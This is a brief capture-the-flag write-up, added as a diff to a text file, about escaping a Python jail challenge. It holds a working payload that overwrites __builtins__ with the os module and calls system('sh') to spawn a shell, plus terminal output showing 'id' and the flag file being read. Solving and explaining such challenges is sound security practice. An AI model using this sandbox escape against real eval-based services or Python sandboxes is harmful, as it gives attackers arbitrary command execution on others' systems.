@@ -1,0 +1,17 @@
+After 3 days me and my teamm8 finally flagged obligatory...
+We started enumerating the functions available and we initially thought to import a module like this or antigravity that do something when imported
+but it failed quite quickly...
+
+We understood that lambda would be a way to execute something but we need to reload the builtins or more like to overwrite them with os library
+And we finally get the payload...
+
+$ python3 jail.py 
+sned cod: (__builtins__:=__import__('os'))and(lambda:system('sh'))()
+$ id
+uid=1000(sand_xcaper) gid=1000(sand_xcaper) groups=1000(sand_xcaper),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)
+
+$ python3 jail.py 
+sned cod: (__builtins__:=__import__('os'))and(lambda:system('sh'))()
+$ cat flag.txt
+actf{c0ulnt_g3t_1t_7o_w0rk_0n_python39_s4dge}
+$
